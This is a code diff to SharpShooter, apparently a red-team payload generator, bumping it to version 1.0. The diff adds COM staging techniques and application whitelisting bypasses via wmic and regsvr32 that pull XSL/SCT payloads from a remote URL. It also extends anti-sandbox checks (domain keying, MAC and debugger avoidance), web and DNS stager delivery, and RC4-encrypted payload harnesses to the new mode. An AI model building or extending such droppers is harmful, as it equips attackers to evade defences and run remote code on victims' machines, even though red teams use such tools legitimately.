@@ -41,7 +41,7 @@ class SharpShooter:
     /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                          /_/                                            
 
-     \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v0.2\033[0;0m
+     \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v1.0\033[0;0m
     """
 
     def validate_args(self):
@@ -57,6 +57,9 @@ class SharpShooter:
         parser.add_argument("--interactive", action='store_true', help="Use the interactive menu")
         parser.add_argument("--stageless", action='store_true', help="Create a stageless payload")
         parser.add_argument("--dotnetver", metavar="<ver>", dest="dotnetver", default=None, help="Target .NET Version: 2 or 4")
+        parser.add_argument("--com", metavar="<com>", dest="comtechnique", default=None, help="COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote")
+        parser.add_argument("--awl", metavar="<awl>", dest="awltechnique", default=None, help="Application Whitelist Bypass Technique: wmic, regsvr32")
+        parser.add_argument("--awlurl", metavar="<awlurl>", dest="awlurl", default=None, help="URL to retrieve XSL/SCT payload")
         parser.add_argument("--payload", metavar="<format>", dest="payload", default=None, help="Payload type: hta, js, jse, vba, vbe, vbs, wsf")
         parser.add_argument("--sandbox", metavar="<types>", dest="sandbox", default=None, help="Anti-sandbox techniques: " + antisandbox)
         parser.add_argument("--delivery", metavar="<type>", dest="delivery", default=None, help="Delivery method: web, dns, both")
@@ -134,6 +137,11 @@ class SharpShooter:
             if(args.smuggle):
                 if not args.template:
                     print("\033[1;31m[!]\033[0;0m Template name required when smuggling")
+                    sys.exit(-1)
+
+            if(args.comtechnique):
+                if not args.awlurl:
+                    print("\033[1;31m[!]\033[0;0m --awlurl required when COM staging")
                     sys.exit(-1)
 
         return args
@@ -262,7 +270,10 @@ class SharpShooter:
                     raise Exception
 
                 if(payload_type == 1):
-                    template_body = self.read_file(template_base + "vbs")
+                    if(args.comtechnique):
+                        template_body = self.read_file(template_base + "js")
+                    else:
+                        template_body = self.read_file(template_base + "vbs")
                     file_type = "hta"
                 elif(payload_type == 2):
                     template_body = self.read_file(template_base + "js")
@@ -276,10 +287,16 @@ class SharpShooter:
                     #template_body = read_file(template_base + "vba")
                     #file_type = "vba"
                 elif(payload_type == 5):
-                    template_body = self.read_file(template_base + "vbs")
+                    if(args.comtechnique):
+                        template_body = self.read_file(template_base + "js")
+                    else:
+                        template_body = self.read_file(template_base + "vbs")
                     file_type = "vbs"
                 elif(payload_type == 6):
-                    template_body = self.read_file(template_base + "vbs")
+                    if(args.comtechnique):
+                        template_body = self.read_file(template_base + "js")
+                    else:
+                        template_body = self.read_file(template_base + "vbs")
                     file_type = "vbs"
                 elif(payload_type == 7):
                     template_body = self.read_file(template_base + "js")
@@ -336,15 +353,15 @@ class SharpShooter:
                     if len(domain_name) <= 1:
                         raise Exception
                     else:
-                        print("\033[1;34m[*]\033[0;0m Adding keying for %s domain") % domain_name
-                        if("js" in file_type):
+                        print("\033[1;34m[*]\033[0;0m Adding keying for %s domain" % (domain_name))
+                        if("js" in file_type or args.comtechnique):
                             sandbox_techniques += "\to.CheckPlease(0, \"%s\")\n" % domain_name
                         else:
                             sandbox_techniques += "o.CheckPlease 0, \"%s\"\n" % domain_name
                         continue
                 elif(sandboxevasion_type == 2):
                     print("\033[1;34m[*]\033[0;0m Keying to domain joined systems")
-                    if("js" in file_type):
+                    if("js" in file_type or args.comtechnique):
                         sandbox_techniques += "\to.CheckPlease(1,\"foo\")\n"
                     else:
                         sandbox_techniques += "o.CheckPlease 1, \"foo\"\n"
@@ -352,7 +369,7 @@ class SharpShooter:
                 elif(sandboxevasion_type == 3):
                     print("\033[1;34m[*]\033[0;0m Avoiding sandbox artifacts")
 
-                    if("js" in file_type):
+                    if("js" in file_type or args.comtechnique):
                         sandbox_techniques += "\to.CheckPlease(2,\"foo\")\n"
                     else:
                         sandbox_techniques += "o.CheckPlease 2,\"foo\"\n"
@@ -360,7 +377,7 @@ class SharpShooter:
                 elif(sandboxevasion_type == 4):
                     print("\033[1;34m[*]\033[0;0m Avoiding bad MACs")
 
-                    if("js" in file_type):
+                    if("js" in file_type or args.comtechnique):
                         sandbox_techniques += "\to.CheckPlease(3,\"foo\")\n"
                     else:
                         sandbox_techniques += "o.CheckPlease 3,\"foo\"\n"
@@ -368,7 +385,7 @@ class SharpShooter:
                 elif(sandboxevasion_type == 5):
                     print("\033[1;34m[*]\033[0;0m Avoiding debugging")
 
-                    if("js" in file_type):
+                    if("js" in file_type or args.comtechnique):
                         sandbox_techniques += "\to.CheckPlease(4,\"foo\")\n"
                     else:
                         sandbox_techniques += "o.CheckPlease 4,\"foo\"\n"
@@ -482,7 +499,7 @@ class SharpShooter:
                     else:
                         stager = args.web
 
-                    if("js" in file_type or "wsf" in file_type):
+                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                         template_code = template_code.replace("%DELIVERY%", "o.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");" % (refs, namespace, entrypoint, stager))
                     else:
                         template_code = template_code.replace("%DELIVERY%", "o.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"" % (refs, namespace, entrypoint, stager))
@@ -495,7 +512,7 @@ class SharpShooter:
                     else:
                         stager = args.dns
 
-                    if("js" in file_type or "wsf" in file_type):
+                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                         template_code = template_code.replace("%DELIVERY%", "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (refs, namespace, entrypoint, stager))
                     else:
                         template_code = template_code.replace("%DELIVERY%", "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (refs, namespace, entrypoint, stager))
@@ -508,7 +525,7 @@ class SharpShooter:
                     else:
                         stager = args.web
 
-                    if("js" in file_type or "wsf" in file_type):
+                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                         webdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");\n" % (refs, namespace, entrypoint, stager)
                     else:
                         webdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"\n" % (refs, namespace, entrypoint, stager)
@@ -520,7 +537,7 @@ class SharpShooter:
                     else:
                         stager = args.dns
 
-                    if("js" in file_type or "wsf" in file_type):
+                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                         dnsdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (refs, namespace, entrypoint, stager)
                     else:
                         dnsdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (refs, namespace, entrypoint, stager)
@@ -540,11 +557,14 @@ class SharpShooter:
         payload_encrypted = self.rc4(key, template_code)
         payload_encoded = base64.b64encode(payload_encrypted)
 
-        if("js" in file_type):
+        awl_payload_simple = ""
+
+        if("js" in file_type or args.comtechnique):
             harness = self.read_file("templates/harness.js")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded)
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
+            awl_payload_simple = template_code
         elif("wsf" in file_type):
             harness = self.read_file("templates/harness.wsf")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded)
@@ -579,7 +599,19 @@ class SharpShooter:
 
         outputfile_payload = outputfile + "." + file_type
         f = open("output/" + outputfile_payload, 'w')
-        if("js" in file_type or "hta" in file_type or "wsf" in file_type):
+        
+        if(args.comtechnique):
+            if not args.awltechnique or args.awltechnique == "wmic":
+                payload_file = "output/" + outputfile + ".xsl"
+            else:
+                payload_file = "output/" + outputfile + ".sct"
+
+            #if("js" in file_type or "hta" in file_type or "wsf" in file_type):
+            awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, awl_payload_simple)
+            #else:
+            #    awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, payload)
+            f.write(awl_payload)
+        elif("js" in file_type or "hta" in file_type or "wsf" in file_type):
             f.write(payload_minified)
         else:
             f.write(payload)
